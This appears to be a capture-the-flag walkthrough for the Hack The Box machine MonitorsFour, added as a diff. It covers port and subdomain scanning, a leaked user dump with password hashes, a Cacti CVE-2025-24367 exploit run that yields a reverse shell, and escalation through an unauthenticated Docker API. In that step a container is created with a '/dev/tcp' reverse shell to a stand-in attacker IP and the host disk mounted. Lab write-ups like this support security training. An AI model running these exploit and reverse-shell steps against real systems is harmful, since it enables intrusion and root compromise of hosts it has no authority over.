@@ -1,0 +1,168 @@
+  # Let's Start...
+## nmap
+
+└─$ nmap -p80,5985 -A --script=vuln 10.10.11.98 --min-rate=1000
+Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-28 12:48 -0500
+Nmap scan report for monitorsfour.htb (10.10.11.98)
+Host is up (0.10s latency).
+
+PORT     STATE SERV:ICE VERSION
+80/tcp   open  http    nginx
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-csrf: 
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=monitorsfour.htb
+|   Found the following possible CSRF vulnerabilities: 
+|     
+|     Path: http://monitorsfour.htb:80/login
+|     Form id: username
+|     Form action: /api/v1/auth
+|     
+|     Path: http://monitorsfour.htb:80/forgot-password
+|     Form id: 
+|_    Form action: /api/v1/reset
+| http-fileupload-exploiter: 
+|   
+|     Couldn't find a file-type field.
+|   
+|_    Couldn't find a file-type field.
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (88%)
+OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT      ADDRESS
+1   94.50 ms 10.10.14.1
+2   94.61 ms monitorsfour.htb (10.10.11.98)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 549.51 seconds
+______________________________________________________________________________________________________________________________________________________________________________________________________
+# subdomain enum..
+
+┌──(kali㉿kali)-[~/HTB/MonitorsFour/nmap]
+└─$ ffuf -u http://monitorsfour.htb/ -H "Host: FUZZ.monitorsfour.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 3
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://monitorsfour.htb/
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+ :: Header           : Host: FUZZ.monitorsfour.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 3
+________________________________________________
+
+cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 96ms]
+[WARN] Caught keyboard interrupt (Ctrl-C)
+______________________________________________________________________________________________________________________________________________________________________________________________________
+
+           ┌──(kali㉿kali)-[~/HTB/MonitorsFour]
+└─$ ffuf -u http://monitorsfour.htb/user?FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fw 3
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://monitorsfour.htb/user?FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 3
+________________________________________________
+
+token                   [Status: 200, Size: 36, Words: 4, Lines: 1, Duration: 399ms]
+:: Progress: [6453/6453] :: Job [1/1] :: 128 req/sec :: Duration: [0:01:05] :: Errors: 0 ::
+                                                                
+______________________________________________________________________________________________________________________________________________________________________________________________________
+# got then when we input token=0
+
+[{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"8024b78f83f102da4f","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},{"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"75000.00"},{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16","start_date":"2021-06-20","salary":"68000.00"},{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"}]
+______________________________________________________________________________________________________________________________________________________________________________________________________
+
+# Use the CVE shown in the path directory to get a reverse shell
+                                                                                                         
+┌──(kali㉿kali)-[~/HTB/MonitorsFour/tools/CVE-2025-24367-Cacti-PoC]
+└─$ python3 exploit.py -u marcus -p wonderful1 -i 10.10.14.182 -l 4444 -url http://cacti.monitorsfour.htb 
+[+] Cacti Instance Found!
+[+] Serving HTTP on port 80
+[+] Login Successful!
+[+] Got graph ID: 226
+[i] Created PHP filename: 9a5E6.php
+[+] Got payload: /bash
+[i] Created PHP filename: j65RR.php
+[+] Hit timeout, looks good for shell, check your listener!
+[+] Stopped HTTP server on port 80
+
+                                                                                                         
+┌──(kali㉿kali)-[~/HTB/MonitorsFour/tools/CVE-2025-24367-Cacti-PoC]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.182] from (UNKNOWN) [10.129.2.77] 57909
+bash: cannot set terminal process group (8): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@821fbd6a43fa:~/html/cacti$ 
+
+______________________________________________________________________________________________________________________________________________________________________________________________________
+
+Inside the container, scan internal network:
+curl -s http://192.168.65.7:2375/images/json
+
+Docker API is exposed (port 2375) without authentication.
+Create malicious container to gain root access:
+
+Got this from google: cat > create_container.json <<EOF
+{
+  "Image": "docker_setup-nginx-php:latest",
+  "Cmd": ["/bin/bash", "-c", "bash -i >& /dev/tcp/<attacker-ip>/1111 0>&1"],
+  "HostConfig": {
+    "Binds": ["/mnt/host/c:/host_root"]
+  }
+}
+EOF   
+_________________________________________________________________
+Create container:
+curl -H 'Content-Type: application/json' -d @create_container.json "http://192.168.65.7:2375/containers/create" -o response.json   
+_________________________________________________________________
+Start container:
+cid=$(grep -o '"Id":"[^"]*"' response.json | cut -d'"' -f4)
+curl -X POST "http://192.168.65.7:2375/containers/$cid/start"   
+___________________________________________________________________________________________________________________________________________________________________________________________________
+Now go and find the root flag.
